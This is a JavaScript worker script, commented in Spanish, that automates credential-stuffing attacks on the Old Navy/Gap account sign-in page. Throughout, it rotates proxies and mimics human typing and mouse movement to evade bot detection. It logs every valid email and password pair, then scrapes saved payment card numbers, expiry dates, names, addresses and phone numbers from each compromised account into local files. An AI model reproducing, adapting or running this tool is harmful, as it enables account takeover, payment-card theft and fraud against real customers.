const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { parentPort, workerData } = require('worker_threads');
const fs = require('fs');

puppeteer.use(StealthPlugin());

let isPaused = false; // Variable para controlar la pausa

// Función para manejar la pausa
function checkPaused() {
    return new Promise((resolve) => {
        const interval = setInterval(() => {
            if (!isPaused) {
                clearInterval(interval);
                resolve();
            }
        }, 100); // Verifica cada 100ms si el worker sigue en pausa
    });
}

// Manejar mensajes desde el proceso principal
parentPort.on('message', (message) => {
    if (message === 'pause') {
        isPaused = true;
    } else if (message === 'resume') {
        isPaused = false;
    }
});

async function runWorker(credentials, proxies, useProxies, retrySameEmailWithNewProxy, humanizedMode) {
    let proxyIndex = 0;
    const results = [];

    for (let i = 0; i < credentials.length; i++) {
        const { email, password } = credentials[i];
        parentPort.postMessage(`Verificando: ${email}`);

        let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
        let { browser, page } = await createBrowserInstance(proxy);

        try {
            await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', { waitUntil: 'domcontentloaded' });
            

            // Modo Humanizado
            const accessDenied = await page.evaluate(() => {
                const h1Element = document.querySelector('h1');
                return h1Element && h1Element.textContent.includes('Access Denied');
            });
            if (accessDenied) {
                parentPort.postMessage('Elemento "Access Denied" detectado: IP bloqueada.');
                throw new Error('IP bloqueada');
            }            
            
            // Espera a que el campo de correo electrónico esté presente en la página
            await page.waitForSelector('#verify-account-email');
            
            // Introducción del correo electrónico
            await page.type('#verify-account-email', email, { delay: humanizedMode ? randomDelay(100, 400) : randomDelay(50, 150) });
            
            // Modo Humanizado

            if (humanizedMode) {
                // Espera adicional de 2 a 2 segundos antes de hacer clic en el botón
                await new Promise(resolve => setTimeout(resolve, randomDelay(100, 2000)));
                
            
                // Mover el mouse hacia el botón lentamente
                const button = await page.$('.loyalty-email-button');
                const buttonBox = await button.boundingBox();
                await page.mouse.move(
                    buttonBox.x + buttonBox.width / 2,
                    buttonBox.y + buttonBox.height / 2,
                    { steps: randomDelay(10, 20) }
                );
            
                // Espera antes del clic para simular duda
                await new Promise(resolve => setTimeout(resolve, randomDelay(100, 300)));
                
            }
            
            // Clic en el botón de enviar
            // En modo humanizado, se puede añadir un pequeño retraso en el clic para simular un clic humano más lento
            await page.click('.loyalty-email-button', { delay: humanizedMode ? randomDelay(0, 0) : 0 });
            
        

            const navigationResult = await Promise.race([
                page.waitForSelector('#create-account-first-name', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'register'),
                page.waitForSelector('input[name="password"]', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'login'),
            ]);

            if (navigationResult === 'register') {
                parentPort.postMessage('El correo no está registrado.');
                await browser.close();
                continue; // Ir al siguiente email en la lista
            }

            if (navigationResult === 'login') {
                parentPort.postMessage('El correo ya está registrado.');
                await page.type('input[name="password"]', password, { delay: humanizedMode ? randomDelay(100, 200) : randomDelay(50, 150) });

                const signInButtonSelector = await page.$('.loyalty-signInForm-button') || await page.$('.loyalty-signInForm-button-with-legaltext');

                if (signInButtonSelector) {
                    await signInButtonSelector.click();
                } else {
                    parentPort.postMessage('El botón de inicio de sesión no se encontró.');
                    await browser.close();
                    continue; // Pasar al siguiente email
                }

              
               
                try {
                    const passwordError = await page.waitForFunction(
                        () => document.querySelector('.loyalty-signInForm-container')?.innerText.includes('Password not associated with this email address'),
                        { timeout: humanizedMode ? 10000 : 5000 }
                    ).catch(() => false);

                    if (passwordError) {
                        parentPort.postMessage('Contraseña incorrecta. Cerrando navegador.');
                        await browser.close();
                        continue;
                    }

                    await page.waitForSelector('.redesign-sidebar-nav-section-header-title', { timeout: humanizedMode ? 15000 : 10000 });
                    parentPort.postMessage('Inicio de sesión exitoso.');

                    fs.appendFileSync('valid.txt', `\n---------------------------\n${email}:${password}\n---------------------------\n`);

                    await page.goto('https://secure-oldnavy.gap.com/my-account/saved-cards', { waitUntil: 'domcontentloaded' });
                    parentPort.postMessage('Navegando a la sección de tarjetas guardadas...');

                    await page.waitForSelector('.wallet-credit-card-edit', { timeout: humanizedMode ? 15000 : 10000 });
                    parentPort.postMessage('Tarjetas encontradas.');

                    const cards = await page.$$('.wallet-credit-card-edit');
                    parentPort.postMessage(`Número de tarjetas encontradas: ${cards.length}`);

                    for (const [index, card] of cards.entries()) {
                        parentPort.postMessage(`Procesando tarjeta ${index + 1}...`);
                        await page.evaluate(el => el.click(), card);
                        await page.waitForSelector('.add-payment-form', { timeout: humanizedMode ? 15000 : 10000 });
                        parentPort.postMessage(`Formulario de edición de la tarjeta ${index + 1} abierto.`);

                        await new Promise(resolve => setTimeout(resolve, humanizedMode ? 5000 : 3000));

                        const formHTML = await page.evaluate(() => document.querySelector('.add-payment-form').innerHTML);
                        parentPort.postMessage(`HTML del formulario de la tarjeta ${index + 1}:`);

                        try {
                            const extractInputValue = (html, id) => {
                                const regex = new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]+)"`, 'i');
                                const match = regex.exec(html);
                                return match ? match[1] : 'No disponible';
                            };

                            const extractInputByName = (html, name) => {
                                const regex = new RegExp(`<input[^>]*name="${name}"[^>]*value="([^"]+)"`, 'i');
                                const match = regex.exec(html);
                                return match ? match[1] : 'No disponible';
                            };

                            const cardNumber = extractInputValue(formHTML, 'cardNumber');
                            const expirationDate = extractInputValue(formHTML, 'expirationDate');
                            const fullName = extractInputByName(formHTML, 'fullName');
                            const address = extractInputByName(formHTML, 'addressLine1');
                            const city = extractInputByName(formHTML, 'city');
                            const zipCode = extractInputByName(formHTML, 'zipCode');
                            const phoneNumber = extractInputByName(formHTML, 'dayPhone');

                            const stateMatch = formHTML.match(/<button[^>]*>(.*?)<\/button>/);
                            const state = stateMatch ? stateMatch[1] : 'No disponible';

                            parentPort.postMessage(`Datos de la tarjeta ${index + 1}: Número: ${cardNumber}, Expiración: ${expirationDate}, Nombre: ${fullName}, Dirección: ${address}, Ciudad: ${city}, Estado: ${state}, Código Postal: ${zipCode}, Teléfono: ${phoneNumber}`);

                            const cardData = { cardNumber, expirationDate, fullName, address, city, state, zipCode, phoneNumber };
                            saveValidData(email, password, cardData);

                            results.push({ email, password, cardNumber, expirationDate, fullName, address, city, state, zipCode, phoneNumber });

                        } catch (error) {
                            parentPort.postMessage(`Error al extraer los datos de la tarjeta ${index + 1}: ${error.message}`);
                        }

                        try {
                            parentPort.postMessage('Intentando cerrar el formulario...');
                            await page.evaluate(() => {
                                document.querySelector('button[aria-label="close modal"]').click();
                            });

                            await new Promise(resolve => setTimeout(resolve, humanizedMode ? 2000 : 2000));

                            parentPort.postMessage('Formulario cerrado exitosamente.');
                        } catch (error) {
                            parentPort.postMessage('Error al intentar cerrar el formulario: ' + error.message);
                        }

                        await new Promise(resolve => setTimeout(resolve, humanizedMode ? 2000 : 2000));
                    }

                } catch (e) {
                    parentPort.postMessage('Error durante la extracción de datos: ' + e.message);
                }
            } else {
                parentPort.postMessage('No se pudo determinar el estado del correo.');
            }
        } catch (error) {
            if (error.message.includes('net::ERR_NO_SUPPORTED_PROXIES')) {
                parentPort.postMessage(`Proxy ${proxy} no soportado. Cambiando a otro proxy...`);
                await browser.close();
                proxyIndex = (proxyIndex + 1) % proxies.length;
                if (retrySameEmailWithNewProxy) {
                    i--; // Reintentar con el mismo correo pero con un proxy diferente
                }
            } else if (error.name === 'TimeoutError') {
                parentPort.postMessage('TimeoutError detectado. Asumiendo IP bloqueada.');
                if (useProxies && proxies.length > 0) {
                    parentPort.postMessage('Cambiando al siguiente proxy...');
                    proxyIndex = (proxyIndex + 1) % proxies.length;
                    if (retrySameEmailWithNewProxy) {
                        i--; // Reintentar con el mismo correo pero con un proxy diferente
                    }
                }
                await browser.close();
            } else {
                parentPort.postMessage(`Error inesperado: ${error.message}`);
                await browser.close();
            }
            continue;
        }

        await browser.close();
    }

    fs.writeFileSync(`resultados-worker-${process.pid}.json`, JSON.stringify(results, null, 2));
}


async function createBrowserInstance(proxy) {
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--disable-blink-features=AutomationControlled',
        '--disable-extensions',
        '--disable-dev-shm-usage',
        '--disable-infobars',
        '--window-size=1280,800'
    ];

    let proxyAuth;

    if (proxy) {
        const proxyParts = proxy.split(':');
        if (proxyParts.length === 4) {  // Asegurarse de que el proxy tiene el formato correcto
            const proxyUrl = `${proxyParts[0]}:${proxyParts[1]}`;  // host:port
            proxyAuth = {
                username: proxyParts[2],  // username
                password: proxyParts[3]   // password
            };
            args.push(`--proxy-server=${proxyUrl}`);
        } else {
            console.error("Formato de proxy inválido. Se espera: host:port:username:password");
            return;
        }
    }

    try {
        const browser = await puppeteer.launch({
            headless: workerData.useHeadless,
            args: args,
        });

        const page = await browser.newPage();

        if (proxyAuth) {
            await page.authenticate(proxyAuth);
        }

        return { browser, page };

    } catch (error) {
        console.error("Error al crear la instancia del navegador:", error.message);
        // Aquí podrías lanzar el error o manejarlo según lo que necesites hacer.
        throw error; // Lanza el error para que pueda ser manejado en otro lugar, si es necesario.
    }
}


function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function saveValidData(email, password, cardData) {
    const data = `Email: ${email}\nPassword: ${password}\n` +
        `Número: ${cardData.cardNumber}\nExpiración: ${cardData.expirationDate}\n` +
        `Nombre: ${cardData.fullName}\nDirección: ${cardData.address}\nCiudad: ${cardData.city}\n` +
        `Estado: ${cardData.state}\nCódigo Postal: ${cardData.zipCode}\nTeléfono: ${cardData.phoneNumber}\n` +
        `-----------------------------------------\n`;
    fs.appendFileSync('valid.txt', data);
}

runWorker(workerData.credentials, workerData.proxies, workerData.useProxies, workerData.retrySameEmailWithNewProxy ,workerData.humanizedMode).catch(console.error);
